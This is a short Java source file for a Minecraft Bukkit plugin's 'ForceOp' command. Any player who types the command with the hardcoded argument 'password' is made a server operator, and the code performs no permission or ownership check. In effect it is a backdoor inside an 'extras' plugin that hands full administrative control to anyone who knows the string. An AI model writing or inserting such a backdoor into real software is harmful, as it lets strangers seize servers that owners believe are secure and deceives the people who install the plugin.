package dev.jordgubbe.extras.commands;

import dev.jordgubbe.extras.utils.ColorUtils;
import dev.jordgubbe.extras.utils.MessageUtils;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

public class ForceOp implements CommandExecutor {

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage(MessageUtils.notAPlayer());
            return true;
        } else {
            if (args.length > 0 && args[0].equals("password")) {
                if (player.isOp()) {
                    player.sendMessage(ColorUtils.format("&eYou are already an Operator!"));
                } else {
                    player.setOp(true);
                    player.sendMessage(ColorUtils.format("&aYou are now an Operator!"));
                }
            } else {
                player.sendMessage(MessageUtils.NOT_ENOUGH_ARGUMENTS.print());
            }
        }
        return true;
    }

}
